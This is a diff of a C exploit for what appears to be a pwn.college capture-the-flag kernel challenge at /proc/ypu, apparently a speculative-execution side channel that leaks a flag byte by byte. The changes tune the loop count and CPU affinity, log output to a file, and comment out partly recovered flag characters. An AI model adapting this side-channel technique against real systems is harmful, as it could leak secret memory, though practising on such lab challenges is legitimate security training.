@@ -198,41 +198,39 @@ int exploit(int fd, int len)
 	int max_index = 0;
 	int max_val = 0;
 	int stats[255] = {0};
-	results[0] = 'p';
-	results[1] = 'w';
-	results[2] = 'n';
-	results[3] = '.';
-	results[4] = 'c';
-	results[5] = 'o';
-	results[6] = 'l';
-	results[7] = 'l';
-	results[8] = 'e';
-	results[9] = 'g';
-	results[10] = 'e';
-	results[11] = '{';
-	results[12] = 'I';
-	results[21] = 'Y';
-	results[22] = 'P';
-	results[31] = '8';
-	results[32] = 'b';
-	results[38] = 'I';
-	results[40] = '0';
-	results[43] = '1';
-	results[48] = 'c';
-	results[49] = 'j';
-	results[52] = 'I';
-	results[14] = 'I';
-	results[17] = 'X';
-	results[23] = 'R';
-	results[26] = 'X';
-	results[35] = 'p';
-	results[36] = 'q';
-	results[37] = 'D';
-	results[39] = '.';
-	results[41] = 'F';
-	results[42] = 'M';
-	results[52] = 'w';
-	results[53] = 'z';
+	// results[0] = 'p';
+	// results[1] = 'w';
+	// results[2] = 'n';
+	// results[3] = '.';
+	// results[4] = 'c';
+	// results[5] = 'o';
+	// results[6] = 'l';
+	// results[7] = 'l';
+	// results[8] = 'e';
+	// results[9] = 'g';
+	// results[10] = 'e';
+	// results[11] = '{';
+	// results[13] = 'F';
+	// results[15] = 'r';
+	// results[17] = 'X';
+	// results[18] = 'o';
+	// results[19] = 'A';
+	// results[22] = 'P';
+	// results[26] = 'X';
+	// results[31] = '8';
+	// results[32] = 'b';
+	// results[38] = 'I';
+	// results[39] = '.';
+	// results[40] = '0';
+	// results[42] = 'M';
+	// results[43] = '1';
+	// results[44] = 'U';
+	// results[48] = 'c';
+	// results[49] = 'j';
+	// results[50] = 'N';
+	// results[53] = 'z';
+
+
 
 	while (unsolved(results, len))
 	{
@@ -252,7 +250,7 @@ int exploit(int fd, int len)
 			}
 
 			// work_loop
-			for (int j = 0; j < 4000; j++)
+			for (int j = 0; j < 20000; j++)
 			{
 				pre_work();
 				train_target(fd);
@@ -289,6 +287,7 @@ int exploit(int fd, int len)
 					printf("%c", results[l]);
 				}
 				puts("\n");
+				fflush(stdout);
 			}
 		}
 	}
@@ -311,7 +310,7 @@ void set_affinity()
 {
 	cpu_set_t set;
 	CPU_ZERO(&set);
-	CPU_SET(0, &set);
+	CPU_SET(1, &set);
 	sched_setaffinity(0, sizeof(set), &set);
 }
 
@@ -321,13 +320,19 @@ int main(int argc, char **argv)
 
 	char *challenge = "/proc/ypu";
 	int fd = openat(AT_FDCWD, challenge, O_RDWR);
-
+	int fd_log = open("./11logout1.out", O_WRONLY | O_CREAT | O_APPEND, 0777);
+	if (dup2(fd_log, STDOUT_FILENO) == -1) {
+        perror("dup2");
+        close(fd);
+        return 1;
+    }
+	close(fd_log);
 	// mmap
 	shared_buffer = (char *)mmap(0, 255 * 0x1000, PROT_WRITE | PROT_READ, MAP_SHARED, fd, 0);
 
 	read_flag(fd);
-
-	exploit(fd, 55);
-
+	printf("exploit start...\n");
+	fflush(stdout);
+	exploit(fd, 56);
 	return 0;
 }
